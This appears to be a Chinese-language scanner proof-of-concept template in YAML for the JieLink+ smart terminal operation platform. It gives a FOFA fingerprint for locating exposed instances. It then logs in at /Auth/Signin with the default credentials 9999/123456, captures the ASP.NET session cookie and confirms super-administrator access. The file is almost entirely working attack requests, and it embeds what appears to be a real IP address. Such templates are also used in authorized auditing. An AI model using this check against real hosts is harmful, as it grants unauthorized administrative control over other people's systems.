id: poc-yaml-jielink-plus-weak-password
info:
  name: JieLink+智能终端操作平台 弱口令漏洞
  severity: high
  tags:
  - 弱口令
  finger: JeLink+
  fofa: title="JieLink+智能终端操作平台"
requests:
- method: POST
  path: /Auth/Signin
  headers:
    Content-Type: application/x-www-form-urlencoded
  data: returnUrl=http%3A%2F%2F111.30.107.22%3A8090%2Fhome%2Fmain&username=9999&password=123456
  expression: status_code == 302 && contains(body,"/home/main")
  output:
  - regex_match(headers,"ASP.NET_SessionId=(?P<cookie>.*?);")
- method: GET
  path: /home/main
  headers:
    Cookie: ASP.NET_SessionId={{.cookie}}
  expression: status_code == 200 && contains(body,"超级管理员 你好") && contains(body,"环境配置")
    && contains(body,"智能终端操作平台")
variables: {}
transport: http
